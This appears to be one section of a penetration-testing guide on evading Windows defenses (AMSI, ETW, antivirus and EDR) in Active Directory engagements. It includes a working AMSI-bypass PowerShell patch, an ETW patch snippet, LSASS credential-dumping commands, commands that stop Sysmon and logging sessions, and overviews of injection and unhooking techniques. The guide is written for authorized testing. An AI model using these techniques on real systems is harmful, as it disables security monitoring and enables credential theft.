# Phase 11: Defense Evasion

> Techniques to run AD pentest tooling in environments with AV/EDR/AMSI/ETW. High-level overview only — evasion is a deep specialty and what works changes monthly.

**Note**: This skill gives concepts and starting points. For real engagements against modern EDRs (CrowdStrike, SentinelOne, Defender for Endpoint), you'll need current research, custom payloads, and probably a C2 framework. Tools like Mimikatz "from PowerShell" won't get past anything modern.

---

## Layers of Detection on Windows

```
[Your tool/payload]
        │
        ▼
1. AMSI (Antimalware Scan Interface)       ← scripts, in-memory PowerShell
        │
        ▼
2. AV signature scanning                    ← static analysis of binaries
        │
        ▼
3. ETW (Event Tracing for Windows)         ← runtime telemetry, .NET especially
        │
        ▼
4. EDR kernel callbacks / minifilters       ← real-time process / file / network
        │
        ▼
5. Behavioral / ML detection                ← cloud analytics + heuristics
        │
        ▼
6. SIEM rules (Event 4624, 4688, Sysmon)    ← post-execution
```

You need to think about each layer.

---

## 1. AMSI Bypass

**Concept**: AMSI is the interface PowerShell/scripting hosts call to ask "is this script malicious?". Patch the AMSI function pointer in your own process and it stops scanning.

### Classic bypass (memory patch — widely signatured, may need obfuscation)
```powershell
$a = [Ref].Assembly.GetTypes() | Where-Object { $_.Name -like "*siUtils" }
$b = $a.GetFields('NonPublic,Static') | Where-Object { $_.Name -like "*Context" }
$c = $b.GetValue($null)
[IntPtr]$d = [Int64]$c + 0x8
[Int32[]]$buf = @(0)
[System.Runtime.InteropServices.Marshal]::Copy($buf,0,$d,1)
```

(That exact string is signatured. You'll need to obfuscate variable names, encode strings as base64, etc.)

### Patching `AmsiScanBuffer` in `amsi.dll`
```powershell
# Hardware-breakpoint or VirtualProtect + memcpy approach.
# Tools: AMSIBypass.ps1 (Flangvik), Invisi-Shell, ConfuserEx for .NET
```

🔴 **OPSEC**: Defender writes `Event ID 1116` for "AMSI signature detection". Any bypass attempt that *fails* triggers this and gets you flagged.

---

## 2. ETW Patching

**Concept**: .NET emits ETW events for assembly loads, JIT, and many other things. EDRs subscribe to those. Patch `EtwEventWrite` (or `EtwWriteUMSettingsString`, or the `etw_provider.Enabled` field in .NET) → silence the telemetry.

```c
// Conceptual — written in C/C# loaders, not pasted directly
// Find EtwEventWrite in ntdll.dll → write ret instruction
unsigned char ret_patch[] = { 0xC3 };
WriteProcessMemory(self_handle, etwEventWriteAddr, ret_patch, 1, NULL);
```

In practice: use a C# tooling framework like **InlineExecute-Assembly**, **DInjector**, **SharpBlock** that handles this.

---

## 3. AV Signature Evasion

For binaries you have to drop (PsExec, Mimikatz, SharpHound):

- **Don't drop them.** Use in-memory execution (Cobalt Strike `execute-assembly`, Sliver, PowerShell reflection).
- **Recompile from source** with renamed functions / strings to break static signatures.
- **Donut + shellcode loader** — converts .NET assemblies to position-independent shellcode that can be injected without writing to disk.
- **Custom loaders** — manual mapping, syscall use (Halo's Gate, Hell's Gate, Tartarus' Gate), indirect syscalls.

### Tools that help
- **Defender Check** — scan against Defender offline before dropping (uses `MpCmdRun.exe -Scan`)
- **AmsiTrigger** — find exactly which strings in a script trigger AMSI
- **ThreatCheck** — find which bytes in a binary trigger Defender's static scan

---

## 4. LSASS Dumping Without Tripping EDR

This is the hardest one — LSASS is hooked from every angle. Options in increasing stealth:

1. **comsvcs.dll MiniDump** — uses Microsoft-signed DLL. Caught by Defender as of 2022+.
2. **ProcDump** with renamed binary — partially works.
3. **Task Manager dump** — manual GUI, often works as a fallback in restricted environments.
4. **nanodump** — opens LSASS via duplicated handles, filters out non-credential streams.
5. **PPLBlade** — bypasses PPL protection on LSASS.
6. **Direct syscalls** to `NtReadVirtualMemory` instead of high-level API hooks.
7. **MiniDump via fork** — fork a handle to a child process, dump the child. (See "nanodump --fork".)

```bash
# Example: nanodump from a privileged shell
nanodump.exe -w C:\Temp\dump.bin
# Transfer off-host, parse with pypykatz
pypykatz lsa minidump dump.bin
```

🔴 **OPSEC**: Even with successful evasion, the act of dumping is bursty memory read on LSASS. Modern EDRs do behavioral detection independent of API hooks. Plan on this being your loudest single action.

---

## 5. Constrained Language Mode (CLM) Bypass

If PowerShell is in CLM (common with AppLocker / WDAC), you can't run unsigned scripts. Workarounds:
- **PowerShell v2 downgrade** — `powershell -version 2` (if v2 is installed; usually isn't on modern Win)
- **Use a non-script .NET loader** instead of PowerShell — Sharp* tools via `execute-assembly`
- **InstallUtil / msbuild / regsvr32 / mshta** — signed-LOLBin code execution paths

---

## 6. Operational Logging Evasion

| Source | How it's silenced |
|--------|-------------------|
| PowerShell Script Block Logging (Event 4104) | Disable by setting reg `HKLM\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging` (requires admin) |
| PowerShell Module Logging | Same registry path under \ModuleLogging |
| Command-line logging (Event 4688) | Disabled by default; if enabled, hard to bypass without disabling auditing |
| Sysmon | Requires admin; can `sc stop sysmon`, or patch via SysmonQuiet-style tools |
| ETW per-channel | Stop the relevant ETW session (`logman stop "DefenderApiLogger" -ets`) |

⚠️ Some of these are aggressive enough that an SOC will notice the *absence* of logs.

---

## 7. Common-Sense OPSEC

Tactical:
- Don't run more enumeration than you need (every query is logged somewhere)
- Time your actions to coincide with normal business hours / activity
- Use the user's expected source IP (their workstation) — not your Kali box — when possible
- Prefer Kerberos auth over NTLM (less anomalous in modern domains)
- Use AES Kerberos encryption (`/aes256`) — RC4 stands out

Strategic:
- Test payloads in a copy of the customer's environment before running them live (if scope allows)
- Have a rollback / "stop the engagement" plan if EDR fires
- Coordinate with the SOC on known-loud actions (DCSync test, etc.) — many engagements include a "white list our test source IP" agreement

---

## Tool Recommendations (Modern, Mid-2025)

Starting points — versions and detection vary, validate yourself:

- **C2**: Sliver (open source), Cobalt Strike (paid), Havoc (open), Mythic (open framework)
- **In-memory tooling**: SilentTrinity, Donut, Inceptor
- **AMSI/ETW bypass**: SharpBlock, AMSI.fail, EtwTi-aware loaders
- **Stealthy LSASS**: nanodump, PPLBlade, MalSeclogon
- **Detection-aware scanners**: ThreatCheck, DefenderCheck, AmsiTrigger

---

## Next Step

→ **Phase 12: Reporting** (`12-reporting.md`) — turn what you did into a deliverable

---

## 8. Process Injection Primitives

Understanding how C2 implants and post-exploitation tools stay resident and avoid detection.

### Classic Injection (heavily detected)
```c
// VirtualAllocEx → WriteProcessMemory → CreateRemoteThread
// Every EDR hooks this. Do not use in mature environments.
```

### Modern Alternatives (research-level — implement via C2 frameworks)

**Early Cascade Injection**: Suspend a new process before it initializes, inject shellcode, resume. The process never runs normally before the shellcode takes over — AMSI and many hooks don't have time to install.

**Mockingjay**: Abuses RWX sections in legitimate DLLs (some modules ship with read-write-execute memory already). Writes shellcode into existing RWX memory — no `VirtualProtect` call (which is heavily monitored) needed.

**Module Stomping / Overloading**: Map a legitimate DLL into memory, then overwrite its code with shellcode. From the OS's perspective, the memory belongs to a legitimate module.

**Thread Hijacking**: Suspend a thread in a target process, overwrite its RIP register to point at shellcode, resume. No new thread created — harder to detect via thread creation hooks.

**Phantom DLL Hollowing**: Create a section object backed by a temp file, write shellcode to it, map it into a remote process as if it were a legitimate DLL.

> **Practical note for pentests**: These primitives are built into modern C2 frameworks (Sliver, Cobalt Strike BOFs, Havoc). You don't implement them manually — you choose a C2 that uses them. Focus on understanding *what* they do so you can select the right C2 config.

---

## 9. Sleep Obfuscation & Memory Scanning Evasion

EDRs increasingly scan process memory at rest (not just at execution time) looking for known implant signatures. Sleep obfuscation encrypts the implant's memory during sleep periods.

**Techniques**:
- **Ekko** (Cracked5pider): uses `RtlCreateTimer` + `ROP chain` to encrypt shellcode during sleep. The shellcode is XOR'd with a random key, sleeps, decrypts itself on wake.
- **Foliage**: similar concept using `APC` (Asynchronous Procedure Calls) for the encrypt/sleep/decrypt cycle.
- **Gargoyle**: shellcode lives in non-executable memory during sleep, only flips to executable at call time.

These are baked into modern loaders and C2 payloads — not manual techniques but important concepts for understanding why some implants survive memory scans and others don't.

---

## 10. Userland Unhooking (EDR Hook Bypass)

EDRs inject a DLL into every process and hook NTDLL functions (like `NtOpenProcess`, `NtReadVirtualMemory`) to intercept API calls. Unhooking removes these hooks.

**Methods**:

**Fresh NTDLL Map**: Load a fresh copy of `ntdll.dll` directly from disk (not the hooked in-memory version) and remap it over the current one.

```c
// Concept (not paste-and-use — implement in a loader)
// 1. Open ntdll.dll from disk
// 2. Map it into memory
// 3. Copy the .text section over the hooked in-memory ntdll
// Tools: RefleXXion, Perun's Fart, Syswhispers3 combined approach
```

**Direct Syscalls (Syswhispers3)**: Instead of calling hooked NTDLL functions, directly issue syscalls with the correct syscall number. Bypasses userland hooks entirely because you never touch hooked memory.

```asm
; Syscall stub pattern (Syswhispers3 output style)
NtOpenProcess PROC
    mov r10, rcx
    mov eax, <syscall_number>    ; determined at runtime
    syscall
    ret
NtOpenProcess ENDP
```

**Indirect Syscalls**: Find the `syscall` instruction in the real NTDLL (unhooked stub) and jump to it — provides the right syscall number context, bypasses some hook detection.

**Hell's Gate / Halo's Gate / Tartarus' Gate**: Dynamically resolve syscall numbers at runtime by parsing NTDLL in memory — handles patched/hooked stubs by searching nearby functions for the real stub.

> **Again — practical use**: Syswhispers3 and Dinvoke are libraries that handle this for you. The C2 framework (Sliver, Cobalt Strike, Havoc) uses them under the hood in their loaders.

---

## 11. AMSI Bypass — Technical Detail

The AMSI `AmsiScanBuffer` function in `amsi.dll` gets called by PowerShell before executing any script block. Patching it to always return `AMSI_RESULT_CLEAN` (return value 1) bypasses all scanning.

**Approach (conceptual — specific bytes are signatured):**
1. Get the address of `AmsiScanBuffer` in `amsi.dll`
2. Use `VirtualProtect` to make it writable
3. Write a `ret` instruction (0xC3) or patch to return 1
4. Restore memory protection

The *exact* patch bytes change monthly as Defender signatures catch them. Use **AmsiTrigger** to find which part of your script triggers AMSI, then obfuscate or encode only that part.

```powershell
# AmsiTrigger — find the exact offending string
.\AmsiTrigger_x64.exe -i script.ps1 -f 3
# Then: encode/obfuscate the flagged string and re-test
```

**Alternative: Invisi-Shell** — patches AMSI at the .NET layer by hooking the CLR interface before PowerShell loads. More robust than string obfuscation.

